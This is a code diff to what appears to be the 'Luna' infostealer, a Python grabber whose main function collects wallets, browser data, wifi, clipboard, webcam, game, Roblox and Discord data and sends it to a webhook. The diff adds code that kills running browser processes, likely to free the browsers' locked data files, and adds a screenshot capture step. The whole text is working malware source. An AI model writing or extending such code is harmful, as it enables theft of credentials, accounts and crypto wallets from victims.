@@ -10,6 +10,7 @@ import zlib
 from multiprocessing import cpu_count
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from zipfile import ZIP_DEFLATED, ZipFile
+import psutil
 
 #global variables
 temp = os.getenv("temp")
@@ -43,8 +44,21 @@ def main(webhook: str):
 		threads.append(steal_wallets)
 	if __CONFIG__["games"]:
 		threads.append(Games)
-	if __CONFIG__["roblox"]:
-		threads.append(Roblox)
+
+	if __CONFIG__["browser"] or __CONFIG__["roblox"]:
+		browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
+			"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
+		browsers_found = []
+		for proc in psutil.process_iter(['name']):
+			process_name = proc.info['name'].lower()
+			if process_name in browser_exe:
+				browsers_found.append(proc)
+
+		for proc in browsers_found:
+			try:
+				proc.kill()
+			except Exception:
+				pass
 
 	with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
 		executor.map(lambda func: func(), threads)
@@ -77,7 +91,7 @@ def main(webhook: str):
 			content = f"@{__CONFIG__['pingtype'].lower()}"
 			data.update({"content": content})
 
-	if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
+	if any(__CONFIG__[key] for key in ["browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
 		if os.path.getsize(_file) == 22:
 			return
 		with open(_file, 'rb') as file:
@@ -92,8 +106,13 @@ def main(webhook: str):
 	if __CONFIG__["discord"]:
 		Discord()
 
-	os.remove(_file)
+	if __CONFIG__["roblox"]:
+		Roblox()
 
+	if __CONFIG__["screenshot"]:
+		Screenshot()
+
+	os.remove(_file)
 
 def Luna(webhook: str):
 	def GetSelf() -> tuple[str, bool]:
